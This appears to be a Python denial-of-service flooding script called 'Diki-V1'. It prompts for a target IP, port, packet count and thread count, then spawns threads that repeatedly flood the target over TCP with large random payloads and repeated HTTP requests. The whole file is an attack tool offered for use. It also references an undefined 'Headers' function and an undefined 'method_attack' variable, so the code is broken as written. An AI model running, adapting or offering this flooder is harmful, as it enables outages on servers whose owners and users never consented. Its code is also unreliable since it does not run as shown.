# import module
import os, sys

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1']
acceptall = [
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n'
]
referers = ['Your_Server_Got_DDoS_By_Diki-V1!!']
import random
import socket
import threading
import time
import sysconfig
import logging
import colorsys
# Info Tools
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Diki-V1")
print("------------------------------------------------")
print("[+] Tools Used By : Diki")
print("[+] Credit Tools : Diki")
print("[+]Tools DDoS By : Diki")
print("------------------------------------------------")
ip = str(input("[/] Enter RDP IP : "))
port = int(input("[/] Enter RDP Port (80)   : "))
times = int(input("[/] Enter Packet : "))
threads = int(input("[/] Enter Thread (9024) : "))

def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(90048)
    if method_attack == "1":
        get_host = "GET /DAH_LAH_DI_DDOS HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /DH_LAH_DI_DDOS HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip,port))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            for x in range(times):
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Diki-V1 Attack - Server")
            print("[!]Tools By Diki-V1[!]")
            os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Diki-V1 Attack - Server")
            print("[!]Attack Ip Server ",ip,"[!]")
            os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Diki-V1 Attack - Server")
            print("[!]Attack Port Server ",port,"[!]")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()